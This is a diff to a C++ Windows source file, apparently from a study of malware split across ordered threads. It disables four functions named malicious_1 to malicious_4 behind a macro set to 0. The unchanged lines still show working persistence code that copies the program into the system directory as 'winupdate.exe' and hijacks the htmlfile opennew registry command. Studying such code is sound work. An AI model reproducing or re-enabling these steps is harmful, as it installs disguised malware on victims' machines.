@@ -6,6 +6,8 @@
 #ifndef BULLMOOSE_CPP
 #define BULLMOOSE_CPP
 
+#define MALICIOUS_CODE 0
+
 static long LOOPS = 190000;
 
 int order = 0;
@@ -25,6 +27,7 @@ int sequenceOrder;
 static char OUTPUT_FILENAME[100] = "statistic.log";
 void recordMessage()
 {
+    int i;
     FILE *fp;
     if ((fp = fopen(OUTPUT_FILENAME, "a+")) == NULL)
     {
@@ -36,6 +39,7 @@ void recordMessage()
         {
             fprintf(fp, "%d, ", sequence[i]);
         }
+        fprintf(fp, "\n");
     }
 
     fclose(fp);
@@ -73,8 +77,10 @@ void malicious_1()
     if ((1 - order) == 1)
     {
         order = 1;
+#if MALICIOUS_CODE
         GetModuleFileName(NULL, MyPath, sizeof(MyPath));
         GetSystemDirectory(CpyPath, sizeof(CpyPath));
+#endif
     }
     ReleaseMutex(hMutex);
 }
@@ -88,8 +94,10 @@ void malicious_2()
     if ((2 - order) == 1)
     {
         order = 2;
+#if MALICIOUS_CODE
         strcat(CpyPath, "\\winupdate.exe");
         CopyFile(MyPath, CpyPath, FALSE);
+#endif
     }
     ReleaseMutex(hMutex);
 }
@@ -103,8 +111,10 @@ void malicious_3()
     if ((3 - order) == 1)
     {
         order = 3;
+#if MALICIOUS_CODE
         strcat(CpyPath, " %1");
         RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0, KEY_WRITE, &Key32);
+#endif
     }
     ReleaseMutex(hMutex);
 }
@@ -118,8 +128,10 @@ void malicious_4()
     if ((4 - order) == 1)
     {
         order = 4;
+#if MALICIOUS_CODE
         RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
         RegCloseKey(Key32);
+#endif
     }
     ReleaseMutex(hMutex);
 }
